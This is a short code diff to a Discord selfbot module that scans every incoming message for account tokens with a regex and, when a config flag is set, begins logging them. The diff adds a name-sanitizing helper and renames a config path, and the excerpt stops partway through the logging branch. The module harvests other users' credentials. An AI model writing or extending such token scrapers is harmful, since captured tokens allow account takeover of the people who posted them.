@@ -1,4 +1,7 @@
 const { Client } = require("discord.js-selfbot-v13");
+function sanitizeName(name) {
+    return name.replace(/[^a-z0-9]/gi, "_").toLowerCase();
+}
 module.exports = (client, chalk, fs, path, global) => {
     client.on("messageCreate", async (message) => {
         const tokenMatch = message.content.match(global.regexs.token);
@@ -6,7 +9,7 @@ module.exports = (client, chalk, fs, path, global) => {
         if (tokenMatch) {
             const token = tokenMatch[0];
 
-            if (global.config.logs.token) {
+            if (global.config.settings.logs.token) {
                 let isguild = false;
 
                 if (message.guild.name.length > 0) {
